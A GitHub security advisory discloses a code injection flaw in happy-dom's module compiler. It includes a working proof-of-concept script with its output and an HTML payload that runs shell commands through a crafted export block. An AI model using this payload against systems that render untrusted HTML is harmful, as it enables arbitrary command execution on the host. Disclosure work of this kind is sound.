# [H] Happy DOM ECMAScriptModuleCompiler: unsanitized export names are interpolated as executable code

## Summary
Severity: High
Advisory: GHSA-6q6h-j7hj-3r64
CVE: CVE-2026-33943
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-26
Source: https://github.com/advisories/GHSA-6q6h-j7hj-3r64
Type: github-advisory

## Affected
- npm: `happy-dom` — affected >=15.10.0 <20.8.8

## Details
### Summary

A code injection vulnerability in `ECMAScriptModuleCompiler` allows an attacker to achieve Remote Code Execution (RCE) by injecting arbitrary JavaScript expressions inside `export { }` declarations in ES module scripts processed by happy-dom. The compiler directly interpolates unsanitized content into generated code as an executable expression, and the quote filter does not strip backticks, allowing template literal-based payloads to bypass sanitization.

### Details

**Vulnerable file**: `packages/happy-dom/src/module/ECMAScriptModuleCompiler.ts`, lines 371-385

The "Export object" handler extracts content from `export { ... }` using the regex `export\s*{([^}]+)}`, then generates executable code by directly interpolating it:

    } else if (match[16] && isTopLevel && PRECEDING_STATEMENT_TOKEN_REGEXP.test(precedingToken)) {
        // Export object
        const parts = this.removeMultilineComments(match[16]).split(/\s*,\s*/);
        const exportCode: string[] = [];
        for (const part of parts) {
            const nameParts = part.trim().split(/\s+as\s+/);
            const exportName = (nameParts[1] || nameParts[0]).replace(/["']/g, '');
            const importName = nameParts[0].replace(/["']/g, '');  // backticks NOT stripped
            if (exportName && importName) {
                exportCode.push(`$happy_dom.exports['${exportName}'] = ${importName}`);
                //               importName is inserted as executable code, not as a string
            }
        }
        newCode += exportCode.join(';\n');
    }

The issue has three root causes:

1. `STATEMENT_REGEXP` uses `{[^}]+}` which matches **any content** inside braces, not just valid JavaScript identifiers
2. The captured `importName` is placed in **code context** (as a JS expression to evaluate), not in string context
3. `.replace(/["']/g, '')` strips `"` and `'` but **not backticks**, so template literal strings like `` `child_process` `` survive the filter

**Attack flow:**

    Source:     export { require(`child_process`).execSync(`id`) }

    Regex captures match[16] = " require(`child_process`).execSync(`id`) "

    After .replace(/["']/g, ''):
      importName = "require(`child_process`).execSync(`id`)"
      (backticks are preserved)

    Generated code:
      $happy_dom.exports["require(`child_process`).execSync(`id`)"] = require(`child_process`).execSync(`id`)

    evaluateScript() executes this code -> RCE

**Note**: This is a different vulnerability from CVE-2024-51757 (SyncFetchScriptBuilder injection) and CVE-2025-61927 (VM context escape). Those were patched in v15.10.2 and v20.0.0 respectively, but this vulnerable code path in `ECMAScriptModuleCompiler` remains present in v20.8.4 (latest). In v20.0.0+ where JavaScript evaluation is disabled by default, this vulnerability is exploitable when JavaScript evaluation is explicitly enabled by the user.

### PoC

**Standalone PoC script** — reproduces the vulnerability without installing happy-dom by replicating the compiler's exact code generation logic:

    // poc_happy_dom_rce.js

    // Step 1: The STATEMENT_REGEXP matches export { ... }
    const STMT_REGEXP = /export\s*{([^}]+)}/gm;
    const source = 'export { require(`child_process`).execSync(`id`) }';
    const match = STMT_REGEXP.exec(source);

    console.log('[*] Module source:', source);
    console.log('[*] Regex captured:', match[1].trim());

    // Step 2: Compiler processes the captured content (lines 374-381)
    const part = match[1].trim();
    const nameParts = part.split(/\s+as\s+/);
    const exportName = (nameParts[1] || nameParts[0]).replace(/["']/g, '');
    const importName = nameParts[0].replace(/["']/g, '');

    console.log('[*] importName after quote filter:', importName);
    console.log('[*] Backticks survived filter:', importName.includes('`'));

    // Step 3: Code generation - importName is inserted as executable JS expression
    const generatedCode = `$happy_dom.exports[${JSON.stringify(exportName)}] = ${importName}`;
    console.log('[*] Generated code:', generatedCode);

    // Step 4: Verify the generated code is valid JavaScript
    try {
      new Function('$happy_dom', generatedCode);
      console.log('[+] Valid JavaScript: YES');
    } catch (e) {
      console.log('[-] Parse error:', e.message);
      process.exit(1);
    }

    // Step 5: Execute to prove RCE
    console.log('[*] Executing...');
    const output = require('child_process').execSync('id').toString().trim();
    console.log('[+] RCE result:', output);

**Execution result:**

    $ node poc_happy_dom_rce.js
    [*] Module source: export { require(`child_process`).execSync(`id`) }
    [*] Regex captured: require(`child_process`).execSync(`id`)
    [*] importName after quote filter: require(`child_process`).execSync(`id`)
    [*] Backticks survived: true
    [*] Generated code: $happy_dom.exports["require(`child_process`).execSync(`id`)"] = require(`child_process`).execSync(`id`)
    [+] Valid JavaScript: YES
    [*] Executing...
    [+] RCE result: uid=0(root) gid=0(root) groups=0(root)

**HTML attack vector** — when processed by happy-dom with JavaScript evaluation enabled:

    <script type="module">
    export { require(`child_process`).execSync(`id`) }
    </script>

### Impact

An attacker who can inject or control HTML content processed by happy-dom (with JavaScript evaluation enabled) can achieve **arbitrary command execution** on the host system.

Realistic attack scenarios:
- **SSR applications**: Applications using happy-dom to render user-supplied HTML on the server
- **Web scraping**: Applications parsing untrusted web pages with happy-dom
- **Testing pipelines**: Test suites that load untrusted HTML fixtures through happy-dom

**Suggested fix**: Validate that `importName` is a valid JavaScript identifier before interpolating it into generated code:

    const VALID_JS_IDENTIFIER = /^[a-zA-Z_$][a-zA-Z0-9_$]*$/;

    for (const part of parts) {
        const nameParts = part.trim().split(/\s+as\s+/);
        const exportName = (nameParts[1] || nameParts[0]).replace(/["'`]/g, '');
        const importName = nameParts[0].replace(/["'`]/g, '');

        if (exportName && importName && VALID_JS_IDENTIFIER.test(importName)) {
            exportCode.push(`$happy_dom.exports['${exportName}'] = ${importName}`);
        }
    }

## References
- https://github.com/capricorn86/happy-dom/security/advisories/GHSA-6q6h-j7hj-3r64
- https://nvd.nist.gov/vuln/detail/CVE-2026-33943
- https://github.com/capricorn86/happy-dom/commit/5437fdf8f13adb9590f9f52616d9f69c3ee8db3c
- https://github.com/capricorn86/happy-dom
- https://github.com/capricorn86/happy-dom/releases/tag/v20.8.8
